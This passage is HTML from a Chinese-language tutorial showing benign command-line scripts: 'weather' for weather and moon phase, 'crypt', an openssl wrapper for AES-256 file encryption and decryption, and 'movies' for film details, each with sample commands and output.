crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ weather Chennai</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d97178278821-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d97178278821-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weather </span><span class=\"crayon-v\">Chennai</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>同样，你可以查看输入以下命令来查看月相（月亮的形态）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d9a351972380\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ weather moon</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d9a351972380-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d9a351972380-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weather </span><span class=\"crayon-v\">moon</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0083 seconds] -->\r\n<p>示例输出：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/93aac59df9c833a9c066b5f5b22a80af.png\" alt=\"\"></p>\n<h4 id=\"toc_6\">4、 Crypt – 加解密文件</h4>\n<p>此脚本对 openssl 做了一层包装，允许你快速轻松地加密和解密文件。</p>\n<p>要加密文件，使用以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d9d147523983\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ crypt -e [original file] [encrypted file]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d9d147523983-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d9d147523983-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">crypt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">original </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">encrypted </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>例如，以下命令将加密 <code>ostechnix.txt</code>，并将其保存在当前工作目录下，名为 <code>encrypt_ostechnix.txt</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83da0317472738\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ crypt -e ostechnix.txt encrypt_ostechnix.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83da0317472738-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83da0317472738-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">crypt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">encrypt_ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>输入两次文件密码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83da4245665979\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEncrypting ostechnix.txt...\r\nenter aes-256-cbc encryption password:\r\nVerifying - enter aes-256-cbc encryption password:\r\nSuccessfully encrypted</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83da4245665979-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83da4245665979-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83da4245665979-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83da4245665979-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83da4245665979-1\"><span class=\"crayon-e\">Encrypting </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83da4245665979-2\"><span class=\"crayon-e\">enter </span><span class=\"crayon-v\">aes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">256</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">cbc </span><span class=\"crayon-e\">encryption </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83da4245665979-3\"><span class=\"crayon-v\">Verifying</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">enter </span><span class=\"crayon-v\">aes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">256</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">cbc </span><span class=\"crayon-e\">encryption </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83da4245665979-4\"><span class=\"crayon-e\">Successfully </span><span class=\"crayon-v\">encrypted</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>上面命令将使用 <strong>AES 256 位密钥</strong>加密给定文件。密码不要保存在纯文本文件中。你可以加密 .pdf、.txt、 .docx、 .doc、 .png、 .jpeg 类型的文件。</p>\n<p>要解密文件，使用以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83da7893337646\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ crypt -d [encrypted file] [output file]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83da7893337646-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83da7893337646-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">crypt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">encrypted </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">output </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83daa032363677\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ crypt -d encrypt_ostechnix.txt ostechnix.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83daa032363677-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83daa032363677-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">crypt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">encrypt_ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>输入密码解密：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dad331603962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDecrypting encrypt_ostechnix.txt...\r\nenter aes-256-cbc decryption password:\r\nSuccessfully decrypted\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dad331603962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dad331603962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dad331603962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dad331603962-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dad331603962-1\"><span class=\"crayon-e\">Decrypting </span><span class=\"crayon-v\">encrypt_ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dad331603962-2\"><span class=\"crayon-e\">enter </span><span class=\"crayon-v\">aes</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">256</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">cbc </span><span class=\"crayon-e\">decryption </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dad331603962-3\"><span class=\"crayon-e\">Successfully </span><span class=\"crayon-i\">decrypted</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dad331603962-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h4 id=\"toc_7\">5、 Movies – 查看电影详情</h4>\n<p>使用这个脚本，你可以查看电影详情。</p>\n<p>以下命令显示了一部名为 “mother” 的电影的详情：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83db1695840431\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ movies mother\r\n\r\n==================================================\r\n| Title: Mother\r\n| Year: 2009\r\n| Tomato: 95%\r\n| Rated: R\r\n| Genre: Crime, Drama, Mystery\r\n| Director: Bong Joon Ho\r\n| Actors: Hye-ja Kim, Bin Won, Goo Jin, Je-mun Yun\r\n| Plot: A mother desperately searches for the killer who framed her son for a girl's horrific murder.\r\n==================================================</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" 